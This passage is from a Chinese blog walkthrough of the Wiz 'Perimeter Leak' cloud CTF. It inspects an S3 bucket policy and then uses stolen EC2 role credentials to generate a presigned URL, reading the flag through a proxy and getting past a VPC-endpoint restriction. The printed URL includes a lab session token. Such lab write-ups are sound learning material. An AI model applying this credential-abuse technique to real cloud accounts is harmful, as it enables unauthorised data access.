<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP-40PQI58C:/mnt/c/Users/legion$ curl -I https://challenge01-470f711.s3.amazonaws.com/</span><br><span class="line">HTTP/1.1 200 Connection established</span><br><span class="line"></span><br><span class="line">HTTP/1.1 403 Forbidden</span><br><span class="line">x-amz-bucket-region: us-east-1</span><br><span class="line">x-amz-request-id: QXHRDMDFPFGNTK05</span><br><span class="line">x-amz-id-2: GlfK4F5TdOpO2C5bFq+KI+ZAk5qYb+6uFphbBH9nhdKa6aewVQBQOgvU/hGIa4uhhB5DLFAs+Tc=</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Date: Tue, 23 Sep 2025 13:07:48 GMT</span><br><span class="line">Server: AmazonS3</span><br></pre></td></tr></table></figure>

<h3 id="尝试直接访问S3失败"><a href="#尝试直接访问S3失败" class="headerlink" title="尝试直接访问S3失败"></a>尝试直接访问S3失败</h3><p>将其在AWSCLI中配置好访问刚才那个桶，有flag 但是没办法读取内容</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509232135097.png" alt="image-20250923213459968"></p>
<p>hello.txt里面仅有一句话</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509232215098.png" alt="image-20250923221509966"></p>
<p>使用<code>aws-enumator</code>枚举一下</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509232130854.png" alt="image-20250923213053698"></p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509232131551.png" alt="image-20250923213151398"></p>
<p>没什么用。</p>
<p>列出存储桶策略</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>~/.cloudfox/cached-data/aws/<span class="number">092297851374</span>$ aws s3api get-bucket-policy --bucket challenge01<span class="number">-470</span>f711 --profile wizone --query <span class="string">&quot;Policy&quot;</span> --output text | jq .</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Deny&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::challenge01-470f711/private/*&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;StringNotEquals&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;aws:SourceVpce&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vpce-0dfd8b6aa1642a057&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<p>这个策略的内容是: 桶 <code>challenge01-470f711</code> 下 <code>private/</code> 文件夹的对象，除非请求来自 VPC 终端节点 <code>vpce-0dfd8b6aa1642a057</code>，否则所有人都不能读取。</p>
<h3 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h3><p>也就是我们需要通过VPC去读取flag</p>
<p>那么现在是目标就是 通过proxy服务器</p>
<p>访问读取存储桶中的flag</p>
<blockquote>
<p><strong>S3预签名</strong></p>
<p>AWS S3 的 <strong>预签名 URL（Pre-signed URL）</strong> 是一种临时授权机制，它允许用户在 <strong>不拥有 AWS 访问权限的情况下</strong>访问特定的 S3 对象（文件）。简单来说，它是一种带有时间限制的“临时密钥”，可以安全地分享 S3 文件。</p>
</blockquote>
<p>生成预签名URL</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP-40PQI58C:~/.cloudfox/cached-data/aws/092297851374$ aws s3 presign s3://challenge01-470f711/private/flag.txt --profile wizone</span><br><span class="line">https://challenge01-470f711.s3.us-east-1.amazonaws.com/private/flag.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASI*****HXCEU7EI44%2F20250923%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250923T143116Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEL7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIQDCK87og6hD08%2B4SurGUvjYtifniKBN9dBRjLEkatHSVgIgGFZSFmqONKphKq2aDww%2BiVz9trEZsaXrGpztJqL5d7MquAUIRxAAGgwwOTIyOTc4NTEzNzQiDGIOQ6JdIUQh2%2B457iqVBWgf44AZ2i6CGN4owREiKXQ6leYQkhF9f78X5VHSbv0eI3rLeLWMxfgAhlaw9MP3WQLCdNz7wnfaUN84cV1SVd9M0zwX%2BJ5d9veMmqMmV%2B2C%2FQWPcAUqLxtt%2FCfoU%2FU8Z6hGoYbhyFFvKSrzWpmNPJCHLBA36C8jlRBvxXLNEuwxGLBCOSCUNFeAaDmJtqJp%2BEDUB5WZaXls3ZX%2FXMGRUdIWQ%2Bx17jiP3SqYJLdJWT%2FLVprLcCpcfDwbYrFAccbo4zGPqnrxm%2FfhSftVnAfUc8olVcEwmxhjN%2F%2Fn5mUve7OrN4Vu3JuccNCyWRSK2m5aIITnokkLZdF6Hc8MkI9dn6ZkW%2F0XnKrYBblN8Z4IjggEVMKl0W0%2BfbIGNwALBfXtikNWKVkAFUvSEcFwxta5ULntecHQzX75m4GLBvzz2Mnywi42WdOFsPZyz%2FP%2BCTUu7oKnPCeJj55RaWhcqnWJctu3TlRqcTJdKkg%2BGT0LsQo8Sr3K0BvzhCI4o3ZxSiMkmsAghn1tvO%2Fm3e6yPbQkbQH%2Bu9kPXnPNNW9uSoIPIhVzDpxI%2BdWuL82zWzGkxQuSsf30ZLmgk174%2BEGMCsNTeA49FlUqBtMkPbiB9uCixli3PK97WHKeaSR3a%2Bc3SZPdwNTwOMzYE3mWFOOxmHGpVC7VMhB4HaWec7BkdYgRPfijqv%2BgW6b%2FOAViTc6kXFktDcqW3TMJFDeJgeC753vtVrWgzRLoxwVcqQCJdTqWYjKG8AgTFV1eSXS5iwwFF6mhdTYAqt8h4ZnURlaKMAesIaVZoawmciTptt25owd1lzOic0u5vSaSAMMJ9Jutjx3w6mhm2vd1ydb6N2xmBoijbKJK5bDRKmOhCmRZAGykfZYDmTZh%2FK4ww8nKxgY6sQFxjYWjh66qXqdCNAOZGbEiOFuiLyfp4g3dhpMRdcp1AObWczEA07xz3bmr0u3SpCc1pM2sAmu2Nk%2FP74voiBnbreNLfDLwc9ryfF1OsVqUBKSS3CXN5ltroN%2FGUEFsj4fJDoTG08C%2Bv3HPgjCuW%2Fr5%2B9EAns8PsKWiRbnE5SNt1eoqKpMjEa%2FbSVTfMc6BtDwurWnaBQxI9YS%2BAd4b1tXcgOtH0Hb0QC7DSenYQQ6KRDI%3D&amp;X-Amz-Signature=0300ffaedca318b96a1c25ab924b969dfe7b40a81d6daa27745e81ed9f68f230</span><br></pre></td></tr></table></figure>

<p>在进行访问之前需要进行url编码</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509232232098.png" alt="image-20250923223223947"></p>
<p>然后访问</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509232232556.png" alt="image-20250923223250410"></p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509240000462.png" alt="result"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Yliken</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/09/23/%E4%BA%91/Abuse%20OpenID%20Connect%20and%20GitLab%20for%20AWS%20Access%20&amp;%20Perimeter%20Leak/">http://example.com/2025/09/23/%E4%BA%91/Abuse%20OpenID%20Connect%20and%20GitLab%20for%20AWS%20Access%20&amp;%20Perimeter%20Leak/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Yliken</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/aws/">aws</a><a class="post-meta__tags" href="/tags/pwnedlabs/">pwnedlabs</a><a class="post-meta__tags" href="/tags/wiz/">wiz</a></div><div class="post-share"><div class="social-share" data-image="/img/essayhead/1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/essayhead/as.jpg" target="_blank"><img class="post-qr-code-img" src="/img/essayhead/as.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/essayhead/as.jpg" target="_blank"><img class="post-qr-code-img" src="/img/essayhead/as.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/09/18/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Democracy/" title="hackmyvm-Democracy"><img class="cover" src="/img/essayhead/84.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">hackmyvm-Democracy</div></div><div class="info-2"><div class="info-item-1"> 写在最前: 这个靶机没有提权的地方 但是这个靶机的SQL注入点是我之前从来没见过的。  靶机: Democracy 下载页面 信息收集主机发现  192.168.56.157即为目标ip 端口扫描  只开放了22与80两个端口 80端口 大致是一个投票系统 为共和党与民主党候选人投票 点击去投票就会跳转到登录页面  如果没有账户可以注册一个  登录与注册页面进行测试没有发现SQL注入漏洞 登录进去之后  有三个功能 分别是 投票, 查看结果, 重置投票 每个账户只能投票一次 点击重置投票之后 投票信息就会清零 重新进行投票  坑点 每当你成功投票一次的时候 下次再去测试投票功能点的时候就要先进行一次重置投票操作 不然这无法得到想要的回显  対这三个功能点抓个包 投票数据包, 以POST方式传递了一个数据  在传递的数据后面加一个单引号&#39;  报错了。 加俩单引号&#39;就成功投票,且没有报错  但是当在后面加上&#39; -- a的时候 页面仍然报错。  按道理来说--...</div></div></div></a><a class="pagination-related" href="/2025/09/26/%E4%BA%91/%E4%BA%91%E5%8E%9F%E7%94%9F/pwnedlabs-k8s/" title="【Pwnedlabs】Exploit Kubernetes Overly Permissive RBAC"><img class="cover" src="/img/essayhead/42.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">【Pwnedlabs】Exploit Kubernetes Overly Permissive RBAC</div></div><div class="info-2"><div class="info-item-1">Exploit Kubernetes Overly Permissive RBAC 背景 贵公司受聘对新客户的数字基础设施进行渗透测试。经过初步侦察后，您发现可以访问一个凭证已被盗用的 EC2 实例。该实例可能充当了客户 Kubernetes 环境的网关。您的任务是利用这些凭证，探索潜在漏洞，并利用其 Kubernetes 设置中的弱点，最终获得其服务器的 root 级访问权限。  目标:10.1.20.179 目标与环境识别一个演唱会购票页面  随意买一场门票并输入信息之后 会自动生成并下载一个pdf文件。pdf中包含输入的昵称信息  触发了一个报错,  我只在flask里面见过这样子的Method Not Allowed 也可能是我见得少🤣 所以我认为后端是由python flask框架起的一个http服务 由于它做了一个nginx反向代理。 我并没有在数据包或者页面返回头中找到更有效的证据来指明他是python flask应用  SSTI漏洞利用与初始立足然后我在昵称信息表单中输入一个经典的SSTIpayload&#123;&#123; 7 * 7...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/10/08/%E4%BA%91/Exploit%20Jenkins%20in%20the%20Cloud/" title="【Pwnedlabs】Exploit Jenkins in the Cloud"><img class="cover" src="/img/essayhead/73.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-08</div><div class="info-item-2">【Pwnedlabs】Exploit Jenkins in the Cloud</div></div><div class="info-2"><div class="info-item-1">目标  nmap 12345678910──(kali㉿kali)-[~/Desktop]└─$ nmap -p- -T4 10.1.20.120    Nmap scan report for 10.1.20.120Host is up (0.37s latency).Not shown: 65533 closed tcp ports (reset)PORT     STATE SERVICE22/tcp   open  ssh8080/tcp open  http-proxyNmap done: 1 IP address (1 host up) scanned in 1776.62 seconds      8080端口运行了一个Jenkins   Jenkins 没有开启认证服务  每当我看到这里 我就认为差不多就可以在这个Jenkins 服务器上面为所欲为了。 因为在Dashboard/Manage Jenkins/Script Console中你可以编写你自己的Groovy来进行命令执行 比如 1234def proc = &quot;ls -la...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="artalk-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/essayhead/second.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Yliken</div><div class="author-info-description">红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">63</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">32</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Yliken"><i class="fab fa-github"></i><span>Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Yliken" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:largetlafonu71@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">他说你任何为人称道的美丽  不及他第一次遇到你</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Abuse-OpenID-Connect-and-GitLab-for-AWS-Access"><span class="toc-number">1.</span> <span class="toc-text">Abuse OpenID Connect and GitLab for AWS Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">初始信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84%EF%BC%9AGitLab-OIDC-%E4%BF%A1%E4%BB%BB%E8%A7%92%E8%89%B2"><span class="toc-number">1.2.</span> <span class="toc-text">发现攻击路径：GitLab OIDC 信任角色</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-GitLab-CI-CD-%E8%8E%B7%E5%8F%96%E4%B8%B4%E6%97%B6%E5%87%AD%E8%AF%81"><span class="toc-number">1.3.</span> <span class="toc-text">利用 GitLab CI&#x2F;CD 获取临时凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%EF%BC%9A%E4%BB%8E-louise-%E5%88%B0-engineering-%E8%A7%92%E8%89%B2"><span class="toc-number">1.4.</span> <span class="toc-text">横向移动：从 louise 到 engineering 角色</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%B8%97%E9%80%8F%EF%BC%9A%E8%8E%B7%E5%8F%96-bob-%E7%9A%84%E5%87%AD%E8%AF%81"><span class="toc-number">1.5.</span> <span class="toc-text">进一步渗透：获取 bob 的凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WIZ%E4%BA%91%E5%AE%89%E5%85%A8%E9%94%A6%E6%A0%87%E8%B5%9B-Perimeter-Leak"><span class="toc-number">2.</span> <span class="toc-text">WIZ云安全锦标赛-Perimeter Leak</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring-Boot-Actuator%E7%AB%AF%E7%82%B9"><span class="toc-number">2.1.</span> <span class="toc-text">Spring Boot Actuator端点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">2.2.</span> <span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96EC2%E5%AE%9E%E4%BE%8B%E8%A7%92%E8%89%B2%E4%B8%B4%E6%97%B6%E5%87%AD%E8%AF%81"><span class="toc-number">2.3.</span> <span class="toc-text">获取EC2实例角色临时凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AES3%E5%A4%B1%E8%B4%A5"><span class="toc-number">2.4.</span> <span class="toc-text">尝试直接访问S3失败</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96flag"><span class="toc-number">2.5.</span> <span class="toc-text">获取flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">2.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/09/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-BabyShell/" title="mazesec-BabyShell"><img src="/img/essayhead/14.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mazesec-BabyShell"/></a><div class="content"><a class="title" href="/2025/11/09/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-BabyShell/" title="mazesec-BabyShell">mazesec-BabyShell</a><time datetime="2025-11-08T16:00:00.000Z" title="发表于 2025-11-09 00:00:00">2025-11-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/08/%E4%BA%91/Exploit%20Jenkins%20in%20the%20Cloud/" title="【Pwnedlabs】Exploit Jenkins in the Cloud"><img src="/img/essayhead/73.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwnedlabs】Exploit Jenkins in the Cloud"/></a><div class="content"><a class="title" href="/2025/10/08/%E4%BA%91/Exploit%20Jenkins%20in%20the%20Cloud/" title="【Pwnedlabs】Exploit Jenkins in the Cloud">【Pwnedlabs】Exploit Jenkins in the Cloud</a><time datetime="2025-10-07T16:00:00.000Z" title="发表于 2025-10-08 00:00:00">2025-10-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/26/%E4%BA%91/%E4%BA%91%E5%8E%9F%E7%94%9F/pwnedlabs-k8s/" title="【Pwnedlabs】Exploit Kubernetes Overly Permissive RBAC"><img src="/img/essayhead/42.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwnedlabs】Exploit Kubernetes Overly Permissive RBAC"/></a><div class="content"><a class="title" href="/2025/09/26/%E4%BA%91/%E4%BA%91%E5%8E%9F%E7%94%9F/pwnedlabs-k8s/" title="【Pwnedlabs】Exploit Kubernetes Overly Permissive RBAC">【Pwnedlabs】Exploit Kubernetes Overly Permissive RBAC</a><time datetime="2025-09-25T16:00:00.000Z" title="发表于 2025-09-26 00:00:00">2025-09-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/23/%E4%BA%91/Abuse%20OpenID%20Connect%20and%20GitLab%20for%20AWS%20Access%20&amp;%20Perimeter%20Leak/" title="【Pwnedlabs&amp;WIZ】Abuse OpenID Connect and GitLab for AWS Access &amp; Perimeter Leak"><img src="/img/essayhead/1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwnedlabs&amp;WIZ】Abuse OpenID Connect and GitLab for AWS Access &amp; Perimeter Leak"/></a><div class="content"><a class="title" href="/2025/09/23/%E4%BA%91/Abuse%20OpenID%20Connect%20and%20GitLab%20for%20AWS%20Access%20&amp;%20Perimeter%20Leak/" title="【Pwnedlabs&amp;WIZ】Abuse OpenID Connect and GitLab for AWS Access &amp; Perimeter Leak">【Pwnedlabs&amp;WIZ】Abuse OpenID Connect and GitLab for AWS Access &amp; Perimeter Leak</a><time datetime="2025-09-22T16:00:00.000Z" title="发表于 2025-09-23 00:00:00">2025-09-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/18/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Democracy/" title="hackmyvm-Democracy"><img src="/img/essayhead/84.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hackmyvm-Democracy"/></a><div class="content"><a class="title" href="/2025/09/18/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Democracy/" title="hackmyvm-Democracy">hackmyvm-Democracy</a><time datetime="2025-09-17T16:00:00.000Z" title="发表于 2025-09-18 00:00:00">2025-09-18</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By Yliken</div><div class="footer_custom_text">层楼终究误少年 自由早晚乱余生</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  let artalkItem = null
  const option = null
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'

  const destroyArtalk = () => {
    if (artalkItem) {
      artalkItem.destroy()
      artalkItem = null
    }
  }

  const artalkChangeMode = theme => artalkItem && artalkItem.setDarkMode(theme === 'dark')

  const initArtalk = (el = document, pageKey = location.pathname) => {
    artalkItem = Artalk.init({
      el: el.querySelector('#artalk-wrap'),
      server: 'https://yliken.top/',
      site: 'Yliken 的博客',
      darkMode: document.documentElement.getAttribute('data-theme') === 'dark',
      ...option,
      pageKey: isShuoshuo ? pageKey : (option && option.pageKey) || pageKey
    })

    if (GLOBAL_CONFIG.lightbox === 'null') return
    artalkItem.on('list-loaded', () => {
      artalkItem.ctx.get('list').getCommentNodes().forEach(comment => {
        const $content = comment.getRender().$content
        btf.loadLightbox($content.querySelectorAll('img:not([atk-emoticon])'))
      })
    })

    if (isShuoshuo) {
      window.shuoshuoComment.destroyArtalk = () => {
        destroyArtalk()
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    btf.addGlobalFn('pjaxSendOnce', destroyArtalk, 'destroyArtalk')
    btf.addGlobalFn('themeChange', artalkChangeMode, 'artalk')
  }

  const loadArtalk = async (el, pageKey) => {
    if (typeof Artalk === 'object') initArtalk(el, pageKey)
    else {
      await btf.getCSS('https://cdn.jsdelivr.net/npm/artalk/dist/Artalk.min.css')
      await btf.getScript('https://cdn.jsdelivr.net/npm/artalk/dist/Artalk.min.js')
      initArtalk(el, pageKey)
    }
  }

  if (isShuoshuo) {
    'Artalk' === 'Artalk'
      ? window.shuoshuoComment = { loadComment: loadArtalk }
      : window.loadOtherComment = loadArtalk
    return
  }

  if ('Artalk' === 'Artalk' || !false) {
    if (false) btf.loadComment(document.getElementById('artalk-wrap'), loadArtalk)
    else setTimeout(loadArtalk, 100)
  } else {
    window.loadOtherComment = loadArtalk
  }
})()</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>